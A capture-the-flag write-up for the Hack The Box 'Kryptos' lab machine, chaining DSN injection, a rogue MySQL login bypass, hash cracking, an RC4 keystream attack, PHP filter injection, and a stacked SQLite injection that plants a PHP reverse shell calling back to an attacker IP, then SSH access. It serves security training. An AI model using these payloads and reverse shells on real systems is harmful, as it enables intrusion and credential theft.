&lt;p&gt;Results are shown below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/index.php		---&amp;gt;	200
/server-status/	---&amp;gt;	403
/icons/		---&amp;gt;	403
/icons/small/	---&amp;gt;	403
/cgi-bin/		---&amp;gt;	403
/dev/			---&amp;gt;	403
/encrypt.php 	---&amp;gt;	redirects to /index.php
/decrypt.php 	---&amp;gt;	redirects to /index.php
/logout.php 		---&amp;gt;	redirects to /index.php
/url.php 		---&amp;gt;	200 - empty page
/aes.php 		---&amp;gt;	200 - empty page
/rc4.php 		---&amp;gt;	200 - empty page
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;login-bypass&quot;&gt;Login bypass&lt;/h2&gt;

&lt;p&gt;By inspecting the source code of &lt;code&gt;index.php&lt;/code&gt;, it is possible to see that there are two hidden fields:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;db&lt;/strong&gt;, which contains the value &lt;em&gt;cryptor&lt;/em&gt;;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;token&lt;/strong&gt;, which contains an anti-XSRF token that changes to each refresh.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;By modifying the value of db and putting something arbitrary, we get an error message:&lt;/p&gt;

&lt;pre&gt;&lt;b&gt;PDOException code: 1044&lt;/b&gt;&lt;/pre&gt;

&lt;p&gt;This error tells us that the database driver used is &lt;strong&gt;PDO&lt;/strong&gt; and this input takes part to the construction of the connection string to the DB. We could find something similar to &lt;a href=&quot;https://www.php.net/manual/en/pdo.construct.php&quot;&gt;this&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;/* Connect to a MySQL database using driver invocation */
$dsn = 'mysql:dbname=cryptos';&lt;/pre&gt;

&lt;p&gt;but we would like to obtain&lt;/p&gt;

&lt;pre&gt;$dsn = 'mysql:dbname=cryptos&lt;b&gt;;host=pentest_box_ip_address_here&lt;/b&gt;';&lt;/pre&gt;

&lt;p&gt;Therefore, we have to modify &lt;strong&gt;db&lt;/strong&gt; accordingly:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cryptos -&amp;gt; cryptos;host=10.10.16.44	
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;database-poisoning&quot;&gt;Database Poisoning&lt;/h2&gt;

&lt;p&gt;We have to provide a fake server to allow the remote host to authenticate against us. &lt;a href=&quot;https://github.com/skelsec/Responder3&quot;&gt;Responder3&lt;/a&gt; comes in help:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# python3 ./Responder3.py -I tun0 -4 -6 -p examples/config_test.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The provided parameters represent:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;-p examples/config_test.py&lt;/strong&gt; — Configuration file (Python).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;-I tun0&lt;/strong&gt; — Interface to bind to.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;-4&lt;/strong&gt; — IP version 4 to be used.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;-6&lt;/strong&gt; — IP version 6 to be used.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s then login with random credentials and:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/kryptos/responder.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$mysqlna$4141414141414141414141414141414141414141*b25658e4107b15ab804df5d06e47ee40a97f2a53
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this string, we do have the hashing algorithm used (&lt;em&gt;mysqlna&lt;/em&gt;), the salt and the salted hash of the password used to login against the DB. With John the Ripper, it is possible to crack it. Lets put first the string obtained into a file, then run John:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# echo &quot;$mysqlna$4141414141414141414141414141414141414141*b25658e4107b15ab804df5d06e47ee40a97f2a53&quot; &amp;gt; hashedpass
root@pentestbox:~# john --wordlist --format=mysqlna /usr/share/wordlists/rockyou.txt hashedpass
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
krypt0n1te            (root)
guesses: 1  time: 0:00:03:21 DONE (Fri Sep 27 06:47:58 2019)  c/s: 300  trying: pt0n1te
Use the &quot;--show&quot; option to display all of the cracked passwords reliably

root@pentestbox:~# john --show hashedpass
?:krypt0n1te

1 password hash cracked, 0 left
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;By trying some combinations with default users as login, we can’t get still to login. Therefore, we have to figure out how to enable us to bypass the login page. A path could be to poison the page and force a login against a local database and creating a fake account. In addition, we want to be able to understand what the victim is expecting from a DB, so we have to log all the errors that will be generated during the attempts.&lt;/p&gt;

&lt;p&gt;First, we have to create a local MySQL Server. Let’s add then to &lt;code&gt;/etc/mysql/my.cnf&lt;/code&gt; the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[mysqld]
bind-address = 0.0.0.0
general-log             = 1
general_log_file        = /var/log/mysql/mysql.log	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;By doing so, we can create an active instance of MySQL listening on our machine and we can build the inner structure of the DB accordingly to what is required. Let’s then start the service and read the logs:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# service mysql start
root@pentestbox:~# tail -f /var/log/mysql/mysql.log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Trigger again the login:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Access denied for user 'dbuser'@'kryptos.htb' (using password: YES)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We do know now the user, so we create both the user and the database &lt;strong&gt;cryptor&lt;/strong&gt;, which we already know:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# mysql -u root -p  
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 55
Server version: 10.3.15-MariaDB-1-log Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&amp;gt; CREATE USER 'dbuser'@'10.10.10.129' IDENTIFIED BY 'krypt0n1te';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]&amp;gt; GRANT ALL ON *.* TO 'dbuser'@'10.10.10.129';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]&amp;gt; FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]&amp;gt; CREATE DATABASE cryptor;
Query OK, 1 row affected (0.000 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Trigger again the login with credentials &lt;code&gt;attacker:password&lt;/code&gt; and we get the query:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT username, password FROM users WHERE username='attacker' AND password='5f4dcc3b5aa765d61d8327deb882cf99'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, the backend expects to have a table &lt;em&gt;users&lt;/em&gt; with two fields, &lt;em&gt;username&lt;/em&gt; and &lt;em&gt;password&lt;/em&gt;. Let’s create them then:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; USE cryptor
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [cryptor]&amp;gt; CREATE TABLE users ( username VARCHAR(255), password VARCHAR(255) );
Query OK, 0 rows affected (0.181 sec)

MariaDB [cryptor]&amp;gt; INSERT INTO users ( username, password ) VALUES ( 'attacker', '5f4dcc3b5aa765d61d8327deb882cf99' );
Query OK, 1 row affected (0.032 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this way, we have managed to login successfully.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/kryptos/loginbypassed.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;weak-encryption&quot;&gt;Weak encryption&lt;/h2&gt;

&lt;p&gt;We found a webservice exposing a tool that allows us to encrypt files with two stream cyphers, AES-CBC and &lt;strong&gt;RC4&lt;/strong&gt;. The decryption part is still under construction. RC4 is vulnerable to &lt;a href=&quot;https://crypto.stackexchange.com/questions/45021/rc4-finding-key-if-we-know-plain-text-and-ciphertext&quot;&gt;known-cleartext attacks&lt;/a&gt; under the condition in which the keystream generated has always the same initialization vector.&lt;/p&gt;

&lt;p&gt;The logic behind the attack can be summed up in the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Feed the cryptosystem with a known input (a file with a long sequence of &lt;code&gt;a&lt;/code&gt;);&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Obtain the encrypted content:&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM/657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF/RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR/wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQm9sqwV6Z9T+WPVdaxTVCv0SDmrGEfyjCJ1cXcnL86GLY4Tc=&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Obtain the bytes of such message (de-base64, bytes, trim unwanted content from xxd):&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; root@pentestbox:~# echo &quot;ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM/657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF/RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR/wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQm9sqwV6Z9T+WPVdaxTVCv0SDmrGEfyjCJ1cXcnL86GLY4Tc=&quot; | base64 -d | xxd -b | sed -e 's/^[^:]*:[[:space:]][[:space:]]*//' -e 's/[[:space:]][[:space:]]*.\{6,6\}$//'

 01100100 01010110 10011011 11110001 01010110 01010100
 00100001 01011110 01101010 10111011 10011010 11001010
 10001111 01010100 10010110 10100000 11000001 00111101
 01100100 00010111 10110000 01000101 10100111 01010110
 00110101 00001110 00011000 01000111 11010111 01001100
 11111111 10101110 01111011 01100101 00101000 00010110
 11110110 01100111 11011011 11100010 00011101 10101010
 11011111 01100111 00110001 10000010 10101101 01111110
 00110011 10101110 11001101 10011110 10100100 01110011
 00111000 11001011 11100010 01101100 00010111 01000000
 11110110 00110001 11011011 10100001 10001010 11111010
 10100000 00101111 10011111 11001100 01111000 10011011
 11001101 00011111 01110100 11011100 11011100 11100000
 01000000 00010100 11011011 01110000 10010011 00100001
 00101110 01001000 01010000 00111101 00011001 00010101
 10100101 00001000 01011110 10001011 00100010 10001000
 01100011 01000011 01001000 10000100 10111101 01100000
 11000001 00100101 11000000 10010100 10110100 11101100
 01011111 00011011 01010011 00001100 01011111 11010001
 10011001 01001001 01010011 01000110 11110111 01101011
 01101000 00111100 10010011 00011100 01000110 11110100
 10110010 01010000 10101011 10111011 00100100 00111110
 00001101 01001100 01010101 00110001 10111000 11010001
 11111111 00001001 10010001 01111101 10010111 00100011
 00111111 01001001 01111100 10110111 10000101 11001010
 01001001 11010011 10101110 10010100 10111010 11000111
 01100110 11001001 00110000 10110010 01001011 10110101
 10011000 10001011 10101001 01001010 00011001 01100000
 11001011 00100110 10010001 10110010 11110101 10010111
 10010101 10110100 01011011 01010011 01111101 10101101
 11100011 00000011 00011000 10101100 11011110 11000000
 01100101 01100100 11100010 10000111 00011100 00010010
 10011000 11010111 01111110 11001001 10100001 10010000
 10011011 11011011 00101010 11000001 01011110 10011001
 11110101 00111111 10010110 00111101 01010111 01011010
 11000101 00110101 01000010 10111111 01000100 10000011
 10011010 10110001 10000100 01111111 00101000 11000010
 00100111 01010111 00010111 01110010 01110010 11111100
 11101000 01100010 11011000 11100001 00110111
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;Bitwise XOR the cleartext and the encrypted content to obtain the keystream &lt;a href=&quot;xor.pw&quot;&gt;xor.pw&lt;/a&gt;;&lt;/li&gt;
  &lt;li&gt;Bitwise XOR the secret encrypted content and the keystream to obtain the secret content in cleartext.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The process has been scripted into &lt;a href=&quot;./resources/kryptos/break_rc4.py&quot;&gt;break_rc4.py&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As suggested in the page itself, it is possible to ask for resources via the HTTP protocol. So, we can try to see some of the 403 files and directories we had before. One of the paths to be explored is for sure &lt;code&gt;/dev/&lt;/code&gt;. By requiring &lt;code&gt;http://127.0.0.1/dev/&lt;/code&gt;, we obtain the RC4 encrypted stream, decrypt it and we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div class=&quot;menu&quot;&amp;gt; &amp;lt;a href=&quot;index.php&quot;&amp;gt;Main Page&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;index.php?view=about&quot;&amp;gt;About&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;index.php?view=todo&quot;&amp;gt;ToDo&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks interesting. Let’s dig in more requiring &lt;code&gt;http://127.0.0.1/dev/index.php?view=todo&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div class=&quot;menu&quot;&amp;gt; &amp;lt;a href=&quot;index.php&quot;&amp;gt;Main Page&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;index.php?view=about&quot;&amp;gt;About&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;index.php?view=todo&quot;&amp;gt;ToDo&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;h3&amp;gt;ToDo List:&amp;lt;/h3&amp;gt; 1) Remove sqlite_test_page.php &amp;lt;br&amp;gt;2) Remove world writable folder which was used for sqlite testing &amp;lt;br&amp;gt;3) Do the needful &amp;lt;h3&amp;gt; Done: &amp;lt;/h3&amp;gt; 1) Restrict access to /dev &amp;lt;br&amp;gt;2) Disable dangerous PHP functions &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Requiring &lt;code&gt;http://127.0.0.1/dev/sqlite_test_page.php&lt;/code&gt; we get an empty page. Also &lt;code&gt;http://127.0.0.1/dev/index.php?view=about&lt;/code&gt; doesn’t provide any valuable content.&lt;/p&gt;

&lt;p&gt;The presence of &lt;code&gt;view&lt;/code&gt; parameter in the url may suggest a possible PHP Filter Injection:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python break_rc4.py eddqibhqbncraed6im1218elh9 /dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first parameter after the filename is the &lt;code&gt;PHPSESSID&lt;/code&gt;.
We do get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;?php
$no_results = $_GET['no_results'];
$bookid = $_GET['bookid'];
$query = &quot;SELECT * FROM books WHERE id=&quot;.$bookid;
if (isset($bookid)) {
   class MyDB extends SQLite3
   {
      function __construct()
      {
     // This folder is world writable - to be able to create/modify databases from PHP code
         $this-&amp;gt;open('d9e28afcf0b274a5e0542abb67db0784/books.db');
      }
   }
   $db = new MyDB();
   if(!$db){
      echo $db-&amp;gt;lastErrorMsg();
   } else {
      echo &quot;Opened database successfully\n&quot;;
   }
   echo &quot;Query : &quot;.$query.&quot;\n&quot;;

if (isset($no_results)) {
   $ret = $db-&amp;gt;exec($query);
   if($ret==FALSE)
    {
    echo &quot;Error : &quot;.$db-&amp;gt;lastErrorMsg();
    }
}
else
{
   $ret = $db-&amp;gt;query($query);
   while($row = $ret-&amp;gt;fetchArray(SQLITE3_ASSOC) ){
      echo &quot;Name = &quot;. $row['name'] . &quot;\n&quot;;
   }
   if($ret==FALSE)
    {
    echo &quot;Error : &quot;.$db-&amp;gt;lastErrorMsg();
    }
   $db-&amp;gt;close();
}
}
?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;sqlite-stacked-sql-injection&quot;&gt;SQLite Stacked SQL Injection&lt;/h2&gt;

&lt;p&gt;In this file, it is written that the folder &lt;code&gt;d9e28afcf0b274a5e0542abb67db0784&lt;/code&gt; is world-writable. More important, the param &lt;code&gt;$query&lt;/code&gt; is not sanitized and could allow a Stacked SQL Injection. The database is a SQLite, so we could create a database file with some PHP inside. After some attempts, it looks impossible to run &lt;code&gt;system&lt;/code&gt;, &lt;code&gt;shell&lt;/code&gt;, &lt;code&gt;systemshell&lt;/code&gt;, &lt;code&gt;popen&lt;/code&gt; and &lt;code&gt;exec&lt;/code&gt; commands.&lt;/p&gt;

&lt;p&gt;The payload therefore for the injection has to be something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS db; CREATE TABLE db.table (field TEXT); INSERT INTO db.table (field) VALUES (&amp;lt;?php'$s=fsockopen(&quot;10.10.16.44&quot;,9119);`/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3`;?&amp;gt;');-- 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While the request has to be something like this:&lt;/p&gt;

&lt;pre&gt;/dev/sqlite_test_page.php?no_results=0&amp;amp;bookid=1&lt;b&gt;;&lt;/b&gt;&lt;/pre&gt;

&lt;p&gt;The whole payload has to be constructed like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{REQUEST_URL_ENCODED}{PAYLOAD_DOUBLE_URL_ENCODED}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We run then the SQLInjection against our target:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis {REQUEST_HERE_ENCODED}{PAYLOAD_HERE_DOUBLE_ENCODED}
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES (&amp;lt;?php'$s=fsockopen(&quot;10.10.16.44&quot;,9119);`/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3`;?&amp;gt;');-- 
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We prepare the listener on the attacker machine and we run the script to open the created file. On two different shells:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# nc -lnvp 9119
listening on [any] 9119 ...

root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis /dev/d9e28afcf0b274a5e0542abb67db0784/db.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nonetheless, it look like that &lt;strong&gt;nc&lt;/strong&gt; dies instantly as the connection is created. Therefore, it looks necessary to use another shell. For this purpose, we have chosen the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;Pentest Monkey’s PHP Reverse Shell&lt;/a&gt;, but it has been reduced in size by suppressing comments, shortening names and removing unnecessary features:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php set_time_limit(0);$i=&quot;10.10.16.9&quot;;$p=9119;$cs=1400;$sh=&quot;/bin/sh -i&quot;;$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&amp;gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again, lets run both nc and our script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# nc -lnvp 9119
listening on [any] 9119 ...

root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis {REQUEST_HERE_ENCODED}{PAYLOAD_HERE_DOUBLE_ENCODED}
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES ('&amp;lt;?php set_time_limit(0);$i=&quot;10.10.16.9&quot;;$p=91;$cs=1400;$sh=&quot;/bin/sh -i&quot;;$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&amp;gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&amp;gt;');-- 
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then, let’s call the created page:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis /dev/d9e28afcf0b274a5e0542abb67db0784/db.php

root@pentestbox:~# nc -lnvp 9119
listening on [any] 9119 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.129] 38780
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;privilege-escalation-to-user-rijndael&quot;&gt;Privilege escalation to user &lt;em&gt;rijndael&lt;/em&gt;&lt;/h2&gt;

&lt;p&gt;From a first look in the file system, it is possible to see that the path &lt;code&gt;/home/rijndael/&lt;/code&gt; is world-readable. Inside of it, there are a few interesting things:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ls -la
...
-rw-rw-r-- 1 root     root       21 Oct 30  2018 creds.old
-rw-rw-r-- 1 root     root       54 Oct 30  2018 creds.txt
drwx------ 2 rijndael rijndael 4096 Mar 13  2019 kryptos
-r-------- 1 rijndael rijndael   33 Oct 30  2018 user.txt
$ cat creds.old
rijndael / Password1
$ cat creds.txt
VimCrypt~02!
�vnd]�K�yYC}�5�6gMRA�n$ -�
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;creds.txt&lt;/code&gt; is a VimCrypt02 file. This file has been encrypted with Blowfish, which is a block-cypher vulnerable from plain-text attacks as well. The file &lt;code&gt;creds.old&lt;/code&gt; makes us suspect that &lt;code&gt;creds.txt&lt;/code&gt; has the same structure, so we could know the first part of it, &lt;code&gt;rijndael /&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can try to crack it. By Googling, we found &lt;a href=&quot;https://github.com/gertjanvanzwieten/vimdecrypt&quot;&gt;vimdecrypt&lt;/a&gt;, which fails for our purpose. Nonetheless, from the source file, we can learn more about the structure of VimCrypt02:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;salt = data[0:8]
iv = data[8:16]
data = data[16:]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since we know the inner structure of the encrypted file, then we can proceed to build our &lt;a href=&quot;./resources/kryptos/crack_blowfish.py&quot;&gt;cracker&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rijndael / bkVBL8Q9HuBSpj
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let’s try then these credentials with SSH:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@pentestbox:~# ssh rijndael@10.10.10.129 
rijndael@10.10.10.129's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Wed Mar 13 12:31:55 2019 from 192.168.107.1
rijndael@kryptos:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;Inside of the home of rijndael, we found a script called &lt;a href=&quot;./resources/kryptos/kryptos.py&quot;&gt;&lt;code&gt;kryptos.py&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import random 
import json
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
from bottle import route, run, request, debug
from bottle import hook
from bottle import response as resp

def secure_rng(seed): 
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed &amp;gt; ths:
            ret += 2**i
    return ret

# Set up the keys
seed = random.getrandbits(128)
rand = secure_rng(seed) + 1
sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
vk = sk.get_verifying_key()

def verify(msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False

def sign(msg):
    return binascii.hexlify(sk.sign(msg))

print &quot;Seed: &quot; + str(seed)
print &quot;Rand:&quot; + str(rand)
print &quot;SK: &quot; + str(sk.privkey)

@route('/', method='GET')
def web_root():
    response = {'response':
                {
                    'Application': 'Kryptos Test Web Server',
                    'Status': 'running'
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

@route('/eval', method='POST')
def evaluate():
    try: 
        req_data = request.json
        print req_data
        expr = req_data['expr']
        sig = req_data['sig']
        # Only signed expressions will be evaluated
        if not verify(str.encode(expr), str.encode(sig)):
            return &quot;Bad signature&quot;
        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
        response = {'response':
                    {
                        'Expression': expr,
                        'Result': str(result) 
                    }
                    }
        return json.dumps(response, sort_keys=True, indent=2)
    except:
        return &quot;Error&quot;

# Generate a sample expression and signature for debugging purposes
@route('/debug', method='GET')
def debug():
    expr = '2+2'
    sig = sign(str.encode(expr))
    response = {'response':
                {
                    'Expression': expr,
                    'Signature': sig.decode() 
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

run(host='127.0.0.1', port=81, reloader=True)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the last row, it sets up a server on port 81. By checking with &lt;code&gt;netstat&lt;/code&gt;, we got a confirmation:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rijndael@kryptos:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
rijndael@kryptos:~$ 
